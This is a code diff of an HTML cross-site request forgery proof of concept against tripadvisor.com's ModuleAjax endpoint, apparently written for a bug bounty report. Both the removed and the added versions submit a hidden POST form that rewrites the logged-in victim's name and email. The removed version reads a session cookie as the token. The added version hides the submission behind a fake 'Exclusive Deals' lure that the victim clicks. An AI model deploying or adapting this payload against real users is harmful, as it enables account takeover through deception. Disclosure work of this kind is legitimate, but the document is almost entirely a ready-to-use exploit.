@@ -1,77 +1,34 @@
 <html>
 <body>
+  <h1 style="cursor:pointer" onclick="submitForm()">Click to View Exclusive Deals!</h1>
+
+  <form id="csrfForm" 
+        action="https://www.tripadvisor.com/ModuleAjax" 
+        method="POST"
+        enctype="application/x-www-form-urlencoded"
+        style="display:none">
+    
+    <!-- Static token (if validation is bypassed) -->
+    <input type="hidden" name="actions" value='[{"params":{"firstname":"ziadbugcrowd"...}}]'>
+    <input type="hidden" name="context" value='{"modules.membercenter...}'>
+    <input type="hidden" name="authenticator" value="Random">
+    <input type="hidden" name="version" value="5">
+    <input type="hidden" name="token" value="STATIC_TOKEN"> <!-- Replace with valid token -->
+  </form>
+
   <script>
-  console.log("[1] Initializing CSRF PoC...");
-
-  // ====== Cookie Extraction ======
-  function getCookie(name) {
-    const cookies = document.cookie.split('; ');
-    const cookie = cookies.find(c => c.startsWith(name + '='));
-    return cookie ? decodeURIComponent(cookie.split('=')[1]) : null;
-  }
-
-  const roybattyToken = getCookie('roybatty');
-  console.log("[2] roybatty cookie value:", roybattyToken);
-
-  // ====== Request Builder ======
-  const form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'https://www.tripadvisor.com/ModuleAjax';
-  form.style.display = 'none';
-
-  const params = {
-    actions: JSON.stringify([{
-      params: {
-        firstname: "ziadbugcrowd",
-        lastname: "test", 
-        primaryEmail: "ziad686@bugcrowdninja.com"
-      },
-      name: "SAVE",
-      resource: "modules.common.entity.LoggedInMember"
-    }]),
-    context: JSON.stringify({
-      "modules.membercenter.model.ContributionCounts": [{
-        memberId: "FOY3v6GnNeOB/lMD3V9UCA=="
-      }]
-    }),
-    authenticator: "Random",
-    version: "5",
-    token: roybattyToken
-  };
-
-  Object.entries(params).forEach(([key, value]) => {
-    const input = document.createElement('input');
-    input.type = 'hidden';
-    input.name = key;
-    input.value = value;
-    form.appendChild(input);
-  });
-
-  // ====== Debugging Interface ======
-  console.log("[3] Form parameters:", params);
-  console.log("[4] Form HTML:", form.outerHTML);
-
-  // ====== Execution Flow ======
-  document.body.appendChild(form);
-  console.log("[5] Form added to DOM");
-
-  // Create hidden iframe for cookie context
-  const iframe = document.createElement('iframe');
-  iframe.style.display = 'none';
-  iframe.src = 'https://www.tripadvisor.com';
-  
-  iframe.onload = () => {
-    console.log("[6] Security context established");
-    setTimeout(() => {
-      console.log("[7] Submitting form...");
-      form.submit();
-    }, 1000);
-  };
-
-  document.body.appendChild(iframe);
+    function submitForm() {
+      // Use iframe to establish security context
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = 'https://www.tripadvisor.com';
+      
+      iframe.onload = () => {
+        document.getElementById('csrfForm').submit();
+      };
+      
+      document.body.appendChild(iframe);
+    }
   </script>
-
-  <!-- Visual Trigger -->
-  <h1 style="color:red">Click anywhere to view travel deals!</h1>
 </body>
 </html>
